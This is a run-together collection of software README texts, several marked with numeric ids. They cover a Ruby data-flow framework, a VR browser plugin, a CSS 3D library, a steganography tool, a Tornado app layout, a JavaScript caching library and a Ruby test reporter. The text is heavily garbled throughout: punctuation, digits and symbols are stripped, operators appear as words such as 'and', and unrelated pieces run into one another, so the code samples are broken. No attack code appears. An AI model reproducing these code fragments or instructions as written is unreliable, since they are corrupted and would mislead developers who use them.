data tsv and wu local from csv summer rb or a more general delimited format cat data tsv and wu local from delimited delimiter summer rb here s a contact validator that relies on a person model to decide whether a contact entry should be yielded require person wukong processor contactvalidator do def process person yield person if person valid relying on the elsewhere defined person model to define valid means the processor can stay skinny and readable wukong can in combination with the deserializing features above turn input text into instances of person cat input json and wu local consumes person from json contactvalidator rb wu local can also serialize records from the contactvalidator processor cat input json and wu local consumes person from json contactvalidator rb to json firstname john  lastname  smith  valid true firstname sally  lastname  johnson  valid true serialization formats work just like deserialization formats with json as well as delimited formats available parsing records into model instances and serializing them out again puts constraints on the model class providing these instances here s what the person class needs to look like class person create a new person from the given attributes supports usage of the consumes flag on the command line param hash attrs return person def self receive attrs new attrs turn this person into a basic data structure supports the usage of the to flag on the command line return hash def towire tohash to support the consumes person syntax the receive class method must take a hash produced from the operation of the from argument and return a person instance to support the to json syntax the person class must implement the towire instance method wukong comes with a logger that all processors have access to via their log attribute this logger has the following priorities debug can be set as a log level info can be set as a log level warn can be set as a log level and here s a processor which uses them all wukong processor logs do def process line log debug line log info line log warn line log error line log fatal line the default log level is debug echo something and wu local logs rb debug       logs something info       logs something warn       logs something error       logs something fatal       logs something though you can set it to something else globally echo something and wu local logs rb log level warn warn       logs something error       logs something fatal       logs something or on a per class basis wu local includes a help message wu local help usage wu local param val and param and p val and p processor and flow wu local is a tool for running wukong processors and flows locally on the command line use wu local by passing it a processor and feeding r run string name of the processor or dataflow to use defaults to basename of the given path you can generate custom help messages for your own processors here s the percentile processor from before but made more usable with good documentation wukong processor percentile do description eof gsub and  and  this processor calculates percentiles from input scores based on a given mean score and a given standard deviation for the scores the mean and standard deviation are given at run time and processed scores will be compared against the given mean and standard deviation the input is expected to consist of float values one per line example cat input dat cat input dat and wu local percentile rb mean  stddev              sqrthalf math sqrt   field mean float default   doc the mean of the assumed distribution field stddev float default   doc the standard deviation of the assumed distribution def process value observation value tof zscore mean observation and stddev percentile  math erfc zscore sqrthalf yield observation percentile join t if you call wu local with the file to this processor as an argument in addition to the original help argument you ll get custom documentation wu local percentile rb help usage wu local param val and param and p val and p processor and flow this processor calculates percentiles from input scores based on a given mean score and a given standard deviation for the scores mean float the mean of the assumed distribution default   r run string name of the processor or dataflow to use defaults to basename of the given path stddev float the standard deviation of the assumed distribution default   wukong provides a dsl for combining processors together into dataflows this dsl is designed to make it easy to replicate the tried and true unix philosophy of building simple tools which do one thing well and then combining them together to create more complicated for example having written the tokenizer processor we can use it in a dataflow along with the built in regexp processor to replicate what we did in the last example requirerelative processors wukong dataflow findtwords do tokenizer and regexp match and t and the and operator connects the output of one processor what it yield s with the input of another its process method in this example every record emitted by tokenizer will be subsequently processed by regexp you can run this dataflow directly mimicing what we did above with single processors chained together on the command line cat novel txt and wu local findtwords rb the wukong dataflow dsl allows for more complicated topologies than just chaining processors together in a linear pipeline the and operator used in the above examples to connect two processors together into a chain can also be used to connect a single processor to multiple processors creating a branch point in the dataflow each branch of the flow will receive the same records this can be used to perform multiple actions with the same record as in the following example wukong dataflow complicated do fromjson and recordize model bookreview and map author and doauthorstuff and and tojson map book and dobookstuff and and tojson each bookreview record yielded by the recordize processor will be passed to both subsequent branches of the flow with each branch doing a different kind of processing output records from both branches which are here turned tojson first will be interspersed in the final output when run a processor like select  which filters its inputs can be used to split a flow into records of two types wukong dataflow complicated do fromjson and parser and select valid and furtherprocessing and and tojson select invalid and trackerrors and null here only records which respond true to the method valid will pass through the first flow applying furtherprocessing and so on while only records which respond true to invalid will pass through the second flow with trackerrors the null processor at the end of this second branch ensures that only records from the first branch will be emitted in the final output flows can be split over and over again allowing for rich semantics when processing an input source wukong dataflow manysplits do fromjson and parser and recordize model bookreview and map author and and tojson map publisher and select domestic and and tojson select international and select northamerican and and select american and and tojson select canadian and and tojson select mexican and and tojson select asian and and tojson select european and and tojson map title and and tojson the process method for a processor must accept a string argument and yield a string argument or something that will tos appropriately coming soon the ability to define consumes and emits to automatically handle serialization and deserialization wukong has a number of built in widgets that are useful for scaffolding your dataflows or using as starting off points for your own processors for any of these widgets you can get customized help say wu local group help serializers are widgets which don t change the semantic meaning of a record merely its representation here s a list tojson  fromjson for turning records into json or parsing json into records totsv  fromtsv for turning array records into tsv or parsing tsv into array records pretty for pretty printing json inputs when you re writing processors that are capable of running in isolation you ll want to ensure that you deserialize and serialize records on the way in and out using the serialization and deserialization for processors which will only run inside a data flow you can optimize by not doing any de serialization until except at the very beginning and at the end wukong dataflow complicated do fromjson and proc and proc and proc procn and tojson in this approach no serialization will be done between processors only at the beginning and end this is actually the implementation behind the serialization options themselves they dynamically prepend and append the appropriate deserializers and serializers there are several general purpose processors which implement common patterns on input and output data these are most useful within the context of a dataflow definition null does what you think it doesn t map perform some block on each flatten flatten the input array filter  select  reject only let certain records through based on a block regexp  notregexp only pass records matching or not matching a regular expression limit only let some number of records pass logger send events to the local log stream extract extract some part of each input event some of these widgets can be used directly perhaps with some arguments wukong processor logeverything do proc and proc and and logger wukong processor logeverythingimportant do proc and proc and and regexp match and important and i and logger other widgets require a block to define their action wukong processor logeverythingimportant do parser and select and record and record priority and important and i and logger there are a selection of widgets that do aggregative operations like counting sorting and summing count emits a final count of all input records sort can sort input streams group will group records by some extracting part and give a count of each group s size moments will emit more complicated statistics mean std dev on the group given some other value to measure here s an example of sorting data right on the command line head tokens txt and wu local sort try adding group head tokens txt and wu local sort and wu local group group abhor  count  group abide  count  group able  count  group about  count  group above  count  you can also use these within a more complicated dataflow wukong dataflow wordcount do tokenize and removestopwords and sort and group wukong comes with a few commands built in you ve seen one already wu local  in many of the examples above wu local is used to model dataflows locally using stdin and stdout for input and output wu local is a core wukong command in the sense that more complicated commands like wu hadoop and wu storm  implemented by wukong plugins ultimately invoke some wu local process wukong also comes with another basic command wu source this command works very similarly to wu local except that it doesn t read any input from stdin instead it generates its own input records in an easy to configure periodic way it thus acts as a source of data for other processes in a unix pipeline here s an example using the identity processor which will have the effect of printing to stdout the exact input received wu source identity from this example it s clear that the records produced by wu source are consecutive integers starting at  and that they are produced at a rate of one record per second wu source can thus be used to turn any processor or dataflow into a source of data wukong processor randomnumbers do def process index yield rand index toi run randomnumbers like this wu source randomnumbers rb           which produces random numbers with an ever greater ceiling you can also completely ignore the input record from wu source in your processor wukong processor generator do def process  yield newrecord def newrecord myrecord new which can produce myrecord instances as it s driven by wu source it s easy to generate several thousand events per second using wu source this way wu source generator rb persec  or use the period which is the inverse of persec to spit out records at a regular interval every  minutes in this example wu source generator rb period  wu source can naturally combine with other dataflows or programs you might write wu source generator rb persec  and wu local myflow the wu command is a convenience command useful when using any of the other wu commands in the context of a ruby project with a instead of typing bundle exec wu local myflow option value which would run wu local using the exact version of wukong and any other dependencies as declared in your project s gemfile and gemfile lock  the wu command lets you type wu local myflow option value essentially adding the bundle exec prefix and munging wu local to wu local for you this can be very helpful when doing lots of work with wukong note if bundle exec wu whatever works in your project but wu whatever fails it is probably because bundler is resolving wu commands to some installation that is not on your path often the case if you ran bundle install standalone ensure that the wukong gem is installed on your system and that it s binaries are your path to use the wu command wukong comes with several helpers to make writing specs using the only method that you need to test in a processor is the process method the rest of the processor s methods and functionality are provided by wukong and are already tested you may want to test this process method in two ways unit tests of the class itself in various contexts integration tests of running the class with the wu local or other command line runner let s start with a simple processor wukong processor tokenizer do def process text text downcase gsub and s w and  split each do and token and yield token you could test this processor directly require spechelper describe tokenizer do subject wukong processor tokenizer new before subject setup after subject finalize subject stop it correctly counts tokens do expect and b and subject process hi there wukong  b to yieldsuccessiveargs hi  there  wukong but having to handle the yield from the block yourself can lead to verbose and unreadable tests wukong defines some helpers for this case require and include them first in your spechelper rb require wukong require wukong and spechelpers rspec configure do and config and config include wukong spechelpers and then use them in your test require spechelper describe tokenizer do itbehaveslike a processor  named tokenizer it emits the correct number of tokens do processor given hi there nmy name is wukong should emit  records it eliminates all punctuation do processor tokenizer given never should emit never it will not emit tokens in a stop list do processor tokenizer stoplist apples  bananas given i like apples and bananas should emit i  like  and let s look at each kind of helper the a processor shared example invoked with rspec s itbehaveslike helper adds some tests that ensure that the processor conforms to the api of a wukong processor the processor method is actually an alias for the more aptly named but less convenient unittestrunner this method accepts a processor name and options just like wu local and other command line tools and returns a wukong unittestrunner instance this runner handles the a registered processor name and options and creates a new processor if no name is given the argument of the enclosing describe or context block is used the object returned by processor is the wukong processor you re testing so you can directly declare introspect on it or declare expectations about its behavior the given method and other helpers like givenjson  giventsv  c is a method on the runner it s a way of lazily feeding records to a processor without having to go through the process method directly and having to handle the block or the processor s lifecycle as in the prior example the output and emit matchers will process all previously given records when they are called this lets you separate instantiation input expectations and output here s a more complicated example the same helpers can be used to test dataflows as well as processors the above test helpers are designed to aid in testing processors functionally because they accept the if you are implementing a new wukong command akin to wu local then you may also want to run integration tests wukong comes with helpers for these too you should almost always be able to test your processors without integration tests your unit tests and the wukong framework itself should ensure that your processors work correctly no matter what environment they are deployed in context running

new backends or add other functionality the wukong local module and the wu local program it supports is itself a wukong plugin the following shows how you might build a simplified version of wukong local as a new plugin we ll call this plugin cat as it will implement a program wu cat that is similar in function to wu local just simplified the first thing to do is include the wukong plugin module in your module cat this registers cat as a wukong plugin include wukong plugin defines any settings specific to cat cat doesn t need to but you can define global settings here if you want you can also check the program name to decide whether to apply your settings this helps you not pollute other commands with your stuff def self configure settings program case program when wu cat settings define input description the input file to use settings define number description prepend each input record with a consecutive number  type boolean configure other programs if you need to lets cat boot up with settings that have already been resolved from the command line or other sources like config files or remote servers added by other plugins the root directory in which the program is executing is also provided def self boot settings root puts cat booting up using resolved settings within directory root if your plugin doesn t interact directly with the command line through a wu tool like wu local or wu hadoop and doesn t directly interface with passing records to processors then you can just require the rest of your plugin s code at this point and be done if you need to implement a new command line tool then you should write a runner a runner is used to implement wukong programs like wu local or wu hadoop here s what the actual program file would look like for our example plugin s wu cat program require cat cat runner run the cat runner class is implemented separately requirerelative driver module cat implements the wu cat command class runner wukong runner usage processor and

9274534, an experimental npapi plugin for chrome and firefox that exposes fun vr devices vr js  in conjunction with a required native browser plugin exposes the oculus rift and razer hydra to javascript in a performant easy to use way the library makes it simple to query the device values in just a few lines of code but also handles more advanced things like computing all the math required for rendering lens distorted scenes if you want it even has a slick api for easily rendering the distored scene that should be easy to drop into any webgl application there s also an example three js wrapper under oh and though it s possible to use node and websockets to get the sensor data i don t recommend it the latency is simply too high ms this plugin allows for a latency similar to if you were developing a native application against the oculus sdk and when running on a correctly configured computer will be pretty darn good note the oculus sdk doesn t like sharing devices you must close other oculus apps before using this in your browser and must close your browser if you want to run another oculus app lame windows chrome  and surprisingly good performance firefox  mac os x chrome  and firefox  safari  extract to some path mac os x run bin and install sh to install the plugin windows chrome open chrome to chrome and and extensions check developer mode and click load unpacked extension select the bin folder in the path you extracted the zip into firefox open an administrator command prompt cd to bin in the path you extracted the zip into run install bat you should see a successful message box you must have the plugin installed before they will run there are many features in chrome you can disable to decrease latency install a canary or chromium build and launch it as follows and applications and google chrome canary app and contents and macos and google chrome canary disable gpu vsync disable image transport surface disable threaded compositing in process gpu some things may not work quite right but it ll be faster in the future there will likely be a simple calibration tool added to the js library but for now the best way to get your ipd is to run team fortress  s calibration tool and copy the value out download apple s graphics tools for xcode from their quartz debug app disable beam sync at the bottom this may cause some tearing but reduces latency this removes a frame of latency right click on desktop personalize choose windows  basic or windows classic if you place any other dom element on top of the canvas rendering your content you may cause extra browser compositing that can slow down your rendering since you have to draw your entire hud and etc distored anyway avoid placing any ui on top of the canvas or adding any css effects to it rounded corners etc use requestanimationframe for your rendering and always render as fast as possible using css transform and matrixd it d be possible to position any dom content correctly then once css shaders are available in browsers the dom content could be distorted and color corrected api allowing direct access to devices implementing the sensor communication and sensor fusion code in javascript allows apps to work on any os chrome runs on chromeos too without the need for plugins unfortunately it s restricted to packaged apps only not the general web and the api does not support

1977989, a library for generating and manipulating css d transforms sprited js makes it easy to manipulate html elements in d space through the use of css d transforms it allows to control the position rotation and scale of the element using simple chainable methods a sprited object is an htmlelement so you can freely use native browser events and properties and control their appearance through css directives when creating a sprited element you can specify an id or class or even provide an existing html element that will be enhanced most of its added methods can then be used as getter or setter depending of the number of arguments bower install sprited  please refer to the comments in the source code for more detailed instructions on how to use these methods sprited issupported check support for css d transforms sprited stage create a root node to use as a main container sprited create creates a new sprited div element sprited box creates a box i e a cube x get and set the x position y get and set the y position z get and set the z position position set the x y and z position move adds the provided values to the current position rotationx get and set the rotation around the x axis rotationy get and set the rotation around the y axis rotationz get and set the rotation around the z axis rotation set the rotation around all axis rotate adds the provided values to the current rotation scalex get and set the scale around the x axis scaley get and set the scale around the y axis scalez get and set the scale around the z axis scale set the scale for all axis appendchild and removechild just kidding these are the native methods of the html elements and remember the sprited object is the html element origin specifies the registration point of the element default is top left corner transformorigin specifies the pivot around which the element is rotated and scaled default is center transformstring lets you decide the order of the transformations perspective sets the amount of perspective mainly useful for the stage default is px css chainable shorthand for setting a css value in the style property addclass and removeclass chainable wrappers for the native classlist add and classlist remove html chainable shorthand for the innerhtml property of the element size chainable shorthand for setting both style width and style height bind and unbind chainable shorthand for addeventlistener and removeeventlistener methods allows to pass multiple events and callbacks tilesize and tileposition basic spritesheet support set generic chainable setter and getter  chrome  firefox and safari have full support for d transforms ie  doesn t support nested transforms transformed elements inside transformed elements it means that you can t create a d hierarchy making it very difficult to achieve a even slightly complex scene camera movements or even a simple cube previous versions of ie have no support at all for transforms current opera versions don t support d transforms but their switch to the webkit and kling rendering engine should bring them on par with other modern browsers the ios browsers have very good support for d transformations as well as blackberry s tablets and recent phones chrome  firefox and opera on android are ok the android stock browser started supporting css d since version     was rather limited so instead of using an img  rather use a div with a background and you ll be fine  please note that the writing of this section is still in progress you ll find answers to your questions looking at the examples provided with the library transformed elements need to have their parent s transform style property set to preserve d in order to appear properly tranformed that s why it is required to have a root element we ll call it a stage that will contain our scene creating a stage is easy thanks to the stage method that creates a new div sets it up and adds it to the document s body this is the easiest solution if we are making a full window d experience var stage sprited stage the default stage is a blank div element absolutely positionned in the center of the page creating an element at position  will make it appear in centered the x axis is pointing to the right the y axis down and the z axis toward the camera sprited js allows to use an existing element as the stage so we can have more control on the way it is presented for instance one could use a rectangular viewport in the middle of existing text content set its overflow property to hidden var stage sprited stage document queryselector mycontainer we create a new sprited with the create method we can specify an id or classname as argument or even use an existing element there is also a box method that we can use as helper function to create boxes and cubes as all setters are chainable we can create most objects with one long line of code once created we have to insert our element into the document generally as a child of the stage or its descendants we will do so using the native appendchild method one important thing to know is that setting a sprited property has no effect until we call the update method methods like addclass or size don t need the update because they each affect distinct css properties but all the position rotation scale and origin properties require a call to update because they are merged into a long string that is injected into the object s style the reason behind this system is performance if we change the position and the rotation of an element the css transform property is only updated once when we call update  and the rendering engine does need to recompute the values two times imagine we write this and and create the stage var stage sprited stage and and create a sprite object var sprite sprited create position    update and and add the sprite to the stage stage appendchild sprite what will you see nothing why because there is no directive about how the sprite is supposed to look one of the interest of sprited is that we will use css code to define your visuals given the fact that a sprited is an htmlelement we can keep our tools and code habits use css transitions and a very little bit of javascript to create interactive animations making a cube rotate requires very few lines of code note that the classnames of the side of the box are automatically added by the box method and css and border px solid white box sizing border box transition transform s ease in out and note might need some vendor prefixes around here and cube front cube back background rgba   cube left cube right background rgba   cube top cube bottom background rgba   and js and var stage sprited stage var cube sprited box  cube stage appendchild cube function

7613828, bram s steganographic framework dissidentx is a censorship resistance tool  it has the capability of steganographically encoding messages in files special features include messages cannot be decoded without the key a single decoder for all file types and encoding techniques including all future ones format specific encoders can be easily written without having to worry about information theoretic encoding or cryptography support for multiple messages to multiple keys in a single file the primary use case for dissidentx is encoding messages in files on the web there should be a utility which scans all objects the user s web browser downloads html files images css files etc for messages using all of the keys the user has entered someone sending messages to that person provides a web service where users who have widely viewed web sites can upload their files and get back slightly modified version with messages steganographically added the web users should not be able to read what the messages are and it should be possible for the service doing the encoding to not have to keep messages in plaintext because encoding rates are so low a number of the parameters to the encoding and decoding libraries have been lowered to not be appropriate for all use cases they should be evaluated in the context of this one the same technology should alse be used for easter egg hunts because that s fun and provides cover traffic as examples the command line tools lineendingencoder and universaldecoder are included lineendingencoder is based on adding trailing spaces to the end of lines in a text file use lineendingencoder like this python lineendingencoder py myfile txt key payload key payload that will modify myfile txt  hiding payload to the key key and payload to the key key any number of key and payload pairs are allowed although any given file can only support a certain total length of payloads the keys are assumed to be in unicode which is correct the payloads are also assumed to be in unicode which is a hack to make the output pretty and not completely general after you encode data with lineendingencoder you can get it back out like this python universaldecoder py myfile txt key which will print out payload likewise for payload and key note that lineendingencoder only gets one bit per line with overhead of seven bytes and that encoding the same section of text repeatedly in a text file doesn t get extra bits the preparemessage function takes a key and plaintext both byte strings and returns another key and ciphertext to be used later this is done as a separate step to enable the use case where messages to be encoded are stored on a server already encrypted the packandencodemessages function takes an array of results from preparemessage and a processed file for the messages to be stored in the processed file is an array consisting alternately of fixed binary strings and arrays of length two giving alternate possible values for that position alternates can be anything semantically valid for the file format being used for example in human readable text files eliminating unnecessary commas in text or alternate spellings for words or alternative word orders can all be used multiple methods of generating alternates can be used in the same file simple implementations are in lineendingsencoder py and tabencoder py  both designed to work on common computer language files more detail on the math involved is in explanation txt q can someone modify the message stored in a file  a no changing even a single byte of the file will completely obliterate any message which was stored q why did you use python as a reference language  a because not having distinct binary and unicode string types is barbaric q can i get a copy of this for another language  a if somebody writes it this code is being released as a reference in the hopes that other people will pick it up and run with it q why are you doing row reduction manually in python instead of using numpy  a because i don t know how feel free to implement improvements q can someone detect that a file has messages encoded in it  a that depends on the encoding used and the properties of the file the data is being encoded in there s a whole field of academic literature on steganography none of which is invalidated by this code what this code does is vastly simplify the implementation of new steganographic techniques and allow a universal decoder and encoding of multiple messages to different keys in the same file q how much data can be encoded in a file  a that s entirely dependant on the file type and specific encoding but if you insist on a made up number let s say a ratio of around   and the encoded message has overhead of about  bytes q why can t it be given more than two alternates for one position to encode more information  a because of math see explanation txt for a bit more detail q your code is horribly inefficient and can be optimized in all kinds of ways  a that s why it s called reference code q it would be possible to pack in data more densely if alternates are required to always be the same length or variable bytes are allowed to be set to arbitrary values  a yes but those put severe restrictions on what can be done in an encoder and hence are less likely to be useful in practice q why don t you use public key encryption  a because bits are precious enough for that to be unwieldy and it would disallow use of arbitrary human readable strings as keys the symmetry is best viewed as a feature because the value of a key is severely diminished if it s widely known there s a reason to hoard them which is the desired behavior

1078369, tornado boilerplate a standard layout for tornado apps  tornado boilerplate is an attempt to set up an convention for utilities to deploy such applications a bit of convention can go a long way tested with tornado v  were the primary inspiration for this layout tornado boilerplate and handlers and foo py base py lib and logconfig and media and css and vendor and js and vendor and images and requirements and common txt dev txt production txt templates and vendor and environment py fabfile py app py settings py all of your tornado requesthandlers go in this directory everything in this directory is added to the pythonpath when the environment py file is imported python packages and modules that aren t really tornado request handlers these are just regular python classes and methods everything in this directory is added to the pythonpath when the environment py file is imported an extended version of the this package includes an initializelogging method meant to be called from the project s settings py that sets python s logging system the default for server deployments is to log to syslog and the default for solo development is simply to log to the console all of your loggers should be children of your app s root logger defined in settings py this works well at the top of every file that needs logging import logging logger logging getlogger five and name a subfolder each for css javascript and images third party files e g the  gs css or jquery go in a vendor and subfolder to keep your own code separate pip requirements files optionally one for each app environment the common txt is installed in every case our fabfile see below installs the project s dependencies from these files it s an attempt to standardize the location for dependencies like rails gemfile we also specifically avoid listing the dependencies in the readme of the project since a list there isn t checked programmatically or ever actually installed so it tends to quickly become out of date project wide templates i e those not belonging to any specific app in the handlers and folder the boilerplate includes a base html template that defines these blocks title text for the browser title bar you can set a default here and append and prepend to it in sub templates using super sitecss primary css files for the site by default includes media and css and reset css and media and css and base css css optional page specific css empty by default use this block if a page needs an extra css file or two but doesn t want to wipe out the files already linked via the sitecss block extrahead any extra content for between the head tags header top of the body inside a div with the id header content after the header  inside a div with the id content footer after content  inside a div with the id footer sitejs after all body content includes site wide javascript files by default includes media and js and application js and jquery in deployed environments links to a copy of jquery on google s cdn if running in solo development mode links to a local copy of jquery from the media and directory because the best way to fight snakes on a plane is with jquery on a plane js just like the css block use the js block for page specific javascript files when you don t want to wipe out the site wide defaults in sitejs this needs to be tested with tornado s templating language a quick look at the documentation indicates that this basic template is compatible but none of our tornado applications are using templates at the moment so it hasn t been tested python package dependencies loaded as git submodules pip s support for git repositories is somewhat unreliable and if the specific package is your own code it can be a bit easier to debug if it s all in one place and not off in a virtualenv at bueda we collect general webapp helpers and views in the separate package comrade and share it among all of our applications it is included here as an example of a python package as a git submodule comrade itself should t be considered part of this boilerplate while it might be useful it s much less generic any directory in vendor and is added to the pythonpath by environment py the packages are not installed with pip however so if they require any compilation e g c and c and and extensions this method will not work modifies the pythonpath to allow importing from the apps and  lib and and vendor and directories this module is imported at the top of settings py to make sure it runs for both local development using django s built in server and in production run through mod wsgi gunicorn etc staging and production environments the boilerplate fabfile is quite thin as a collection of our fabric utilities the main tornado application and also a runnable file that starts the tornado a place to collect application settings ala django there s undoubtedly a better way to do this considering all of the flak django is taking lately for this global configuration for now it works if you have improvements or bug fixes fork the repository on github file an issue for the bug fix and feature request in github create a topic branch push your modifications to that branch send a pull request aman guatam
17380641, jscache is a javascript library that enables caching of javascripts css stylesheets and images using one of my earlier projects localstorage unit to obtain the content of the javascript css or image files cors ajax and a canvas trick for images is used this enables caching of both locally and cross origin files if the right http header access control allow origin is set at the cross origin if cors is not available or something goes wrong with the caching the library will automatically fallback to do a normal http request for the files jscache is especially useful when serving your website for mobile phones as it and hearby increase the user experience by providing a better way to cache the files than the limited http caching available on most mobile phones jscache also speeds up your site in an ordinary webbrowser as it saves http requests and loads all the different files asynchronously if possible the asynchronous loading make events such as when the dom is ready and onload fire earlier and hearby make faster rendering of the page eventhough all files are attempted to be loaded asynchronously you still have the possibility to load the files in some specific order this is done using the then method which will wait for any earlier loads to terminate before executing its callback function hearby you can create a hierarchy of scripts styles and images and load them as you wish this is really useful when you want to load libraries with dependencies as you can ensure that one library actually is loaded before using it in another because of the use of the localstorage polyfill this library has compability for persistent storage in almost all browsers both new and old more about this localstorage polyfill when it comes to the support of cors the first choice of implementation is the xmlhttprequest version  which now adays is supported by every major browser moreover to support older versions of internet explorer the xdomainrequest is also used if none of these are available the old version of xmlhttprequest or the activex versions of ajax is used these do not support cors so in case of such use only the local files will be cached while cors files will be loaded as a normal asynchronous http request from version  and support of xmlhttprequest from version  from version   and support of xmlhttprequest from version  of cors from version  using the xmlhttprequest version  and furthermore support cors from version  using xdomainrequest in addition to this there is support for ajax using either xmlhttprequest or activex from version  version  and support xmlhttprequest from version    and support xmlhttprequest from version   in this example we use the domready method to ensure that the dom is ready to be manipulated before doing anything next we detect if the browser is ie  or lower if so the callback function will be called i e the function holding an alert is invoked next we load a lot of files by having the files in the same load method we state that the order of which the files are loaded are not important and accept that the files are loaded asynchronous finally the then method is used to ensure that the earlier loaded files are finished loading before executing the callback function this way we ensure that jquery is loaded before we use the library to get the firstchild of the element having the id logo in the callback function we load an image append the attributes to the image and append the image before the firstchild of the element having the logo id script type text and javascript jscache domready function jscache detect if lt ie   function and and include some ie  or lower specific code alert ie  or lower load and and load bootstrap css and css fixes for old ie versions url and and netdna bootstrapcdn com and bootstrap and    and css and bootstrap min css  url css and bootstrap round corners css  detect if lt ie   url css and bootstrap ie css  detect if lt ie   and and load jquery library url and and ajax googleapis com and ajax and libs and jquery and    and jquery min js then function and and load image and append to element that is gotten by use of jquery jscache load url images and jscache png  append logo  firstchild attr clss img responsive center block  alt jscache is the most awesome caching tool  title jscache is the most awesome caching tool and script the jscache object is defined as follows jscache unsigned long expires unsigned long modified unsigned long timeout object get in domstring key jscache load in object obj in object obj  jscache then in function callback jscache remove in domstring key jscache clear jscache detect in domstring condition in function callback void domready in function callback the expires variable determines when the cached files is to expire the default value is  day i e      milliseconds if you wish to change this you simply assign a new value to the variable with a long value determining the time in milliseconds the modified variable determines when any of the files was last modified this can be helpful if you have modified some of your local files and wishes to serve these files instead of an old cached version of the file default this variable is zero but this can be changed the same way as the expires variable the timeout variable determines when the ajax call should timeout i e when you have waited too long for loading a file and should instead try to do it the normal way this value is default  seconds i e  milliseconds but can be changed the same way as the expires variable the get method is used to get the cached data this method should always be used instead of the get method of the localstorage object as this method appends a string to the key the method return a file object containing information such as url type data attributes etc the load method is used to load files the method takes an infite amount of special objects containing information about the files to be loaded such an object have the following structure domstring url domstring type boolean cache domstring detect object append object attr domstring format the object has a lot of different variables available but the only required variable is the url variable which should hold the address of the file to be the type variable is optional this variable can be used to statically determine the type of a file when loading files jscache will dynamically try to determine the type of the file but if this variable is set the file will always be handled as the set value the cache variable is optional this variable should hold a boolean that determines whether to cache the file or not if this variable is not set or is set to true jscache will cache the file if the variable is set to false no caching will be performed on the file the detect variable is optional this variable works the same way as the detect method of the jscache object i e this variable should hold a html conditional comments value if the condition is true the file will be loaded the append variable is optional this variable should hold an object that you wish to insert the files before the attr variable is optional this variable holds an object of attributes these attributes are appended to the file loaded for example if you wish to give an image file a title or an alt attribute you have to specify these in this object see the example usage for more information the format variable is optional this is a special variable that currently only should be used when using a image wrapper to get the base value of the image if such a wrapper is used the format variable should be assigned the base in php such a wrapper would look something like this data baseencode filegetcontents images and jscache png echo data image and png base data the then method is used to guarantee that files that has previously been served to the load method is fully loaded before the callback function of this method is invoked this is extremely helpful you are dependent on libraries or other files the remove method is used to remove a specific file from the cache this method should always be used instead of the get method of the localstorage object as this method appends a string to the key the clear method is used to remove all cached files from the cache the detect method is another extremely useful method when having to detect if the browser is internet explorer most of the time all other browsers than ie is rendering your website more or less consistently but as always ie is a pain that needs special fixes to render your site properly this method behave in the same way as the html conditional comments and the method should be handled a string such as if ie and a callback function to be called if the condition the domready method is used to wait for the dom to be ready for manipulation this is useful when having to manipulate with the dom as any manipulation before this state is not ensured to

52784, by tim pease trans i ruby s built in test framework has changed so frequently and rather poorly over the last few years that it has been a relative nightmare to try keep turn working from the deprecation of test unit and the switch to minitest and thru all the many api changes made to minitest itself we re at major version  now  it is simply not conducive to a coder s productivity to have to rewrite a program every year while explaining to gracious bug reporters that it s broken because the underlying api has changed yet again and i i the most recent major change finally added something of a real reporter api that s a good thing although it should have been there from day one yet the new version also removed the runner api that means turn would have revert back to old subclassing and monkey patching tricks in order support certain features such as the solo and cross runners and i i as any programmer can well understand i have no interest in playing these musical chairs any longer i have endeavored to provide preliminary support for minitest v and  which is now in the master branch for the most part the reporter part it is working but there are plenty of loose ends that have to be tied up if everything is to work as it should and i i if someone else would like to take up the mantle of this project please have at it i m available to answer any questions until then consider this entire project deprecated and i nbsp nbsp trans turn is a new way to view test results with longer running tests it can be very frustrating to see a failure f and then have to wait till all the tests finish before you can see what the exact failure was turn displays each test on a separate line with failures being displayed immediately instead of at the end of the tests if you have the ansi gem installed then turn output will be displayed in wonderful technicolor but only if your terminal supports ansi color codes well the only colors are green and red but that is still color general usage provides better test output here is some sample output testmyclass testalt pass testalteq pass testbad fail and test and testmyclass rb  in testbad false is not true testfoo pass testfooeq pass testyourclass testmethoda pass testmethodb pass testmethodc pass  pass  fail  error  total  tests with  assertions in   seconds  turn also provides solo and cross test modes when run from the turn commandline application turn can be used from the command line or via require the command line tool offers additional options for how one runs tests you can use the turn executable in place of the ruby interpreter turn ilib test and testall rb this will invoke the ruby interpreter and automatically require the turn formatting library all command line arguments are passed as is to the ruby interpreter to use the solo runner turn solo ilib test and this will run all tests in the test and directory in a separate process likewise for the cross runner turn cross ilib test and this will run every pairing of tests in a separate process simply require the turn package from within your test suite require turn and autorun this will configure minitest to use turn formatting for displaying test results a better line to use though is the following begin require turn and autorun rescue loaderror end when you distribute your code the test suite can be run without requiring the end user to install the turn package for a rails application put the require line into the test and testhelper rb script now your rails tests will use turn formatting b note and b this changed in version   it used to be just require turn  but because of how bundle exec works it was better to require a subdirectory you can use turn config to adjust turn configuration options are following tests list of file names or glob patterns of tests to run default test and and test test rb exclude list of file names or globs to exclude from tests list default pattern regexp pattern that all test names must match to be eligible to run default and and all matchcase regexp pattern that all test cases must match to be eligible to run default nil all loadpath add these folders to the loadpath default lib requires libs to require when running tests default format reporter type pretty dot cue marshal outline progress default pretty live test against live install i e don t use loadpath option default false verbose verbose output default false trace number of backtrace lines to display default set from env or nil all natural use natural language case names default false ansi force colorized output requires ansi gem default set from env or nil auto to set option just call the desired method turn config format progress also you can use following environment variables to adjust settings backtrace number of backtrace lines to display default set from env or nil ansi force colorize output requires ansi gem finally you can include your own custom reporter type aka format turn will search for reporters in the turn and reporters and directory of your local project and then in your user home directory so for example if you specified the following turn config format cool then turn will look first for and turn and reporters and coolreporter rb  then and turn and reporters and coolreporter rb see source code for examples of how to write your own reporters ansi   and for colorized output and progress bar output mode follow the usual procedure gem install turn support minitest v  general code cleanup  fork it  create your feature branch git checkout b mynewfeature  commit your changes git commit am added some feature  push to the branch git push origin mynewfeature  create a new pull request if you are a project member please follow the same process minus the forking for significant changes please wait for another developer to review and merge them whereas small contributions and fixes can be merged without review to build the gem simply run gem build gemspec an important aspect of turn s design that needs be kept in mind is the way solo and cross testing features are implemented this is some really neat code actually imo  but it might be difficult to grasp with out some explanation what turn does when using the solo or cross options is i shell out to itself and i using the yaml reporter it does this repeatedly for each test or each pair of tests respectively and then collates all the resulting yaml reports into a single report which it then feeds back into the selected reporter mit license copyright c  tim pease copyright c  thomas sawyer

